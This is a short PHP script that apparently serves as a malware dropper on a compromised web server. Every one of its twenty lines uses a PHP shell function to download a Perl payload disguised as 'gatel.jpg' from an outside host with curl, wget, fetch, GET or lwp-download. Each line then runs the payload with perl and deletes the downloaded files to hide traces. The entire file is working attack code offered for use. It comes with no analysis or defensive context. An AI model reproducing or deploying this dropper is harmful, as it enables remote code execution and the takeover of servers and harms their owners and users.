<?php
echo exec('cd /tmp;curl -o http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo exec('cd /tmp;GET http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo exec('cd /tmp;wget http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo exec('cd /tmp;fetch http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo exec('cd /tmp;lwp-download http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo passthru('cd /tmp;fetch http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo passthru('cd /tmp;wget http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo passthru('cd /tmp;curl -o http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo passthru('cd /tmp;GET http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo passthru('cd /tmp;lwp-download http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo system('cd /tmp;curl -o http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo system('cd /tmp;GET http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo system('cd /tmp;wget http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo system('cd /tmp;fetch http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo system('cd /tmp;lwp-download http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo shell_exec('cd /tmp;curl -o http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo shell_exec('cd /tmp;GET http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo shell_exec('cd /tmp;wget http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo shell_exec('cd /tmp;fetch http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
echo shell_exec('cd /tmp;lwp-download http://www.en-tech.co.kr/zeroboard//skin/gatel.jpg;perl gatel.jpg;rm -rf *.jpg*');
?>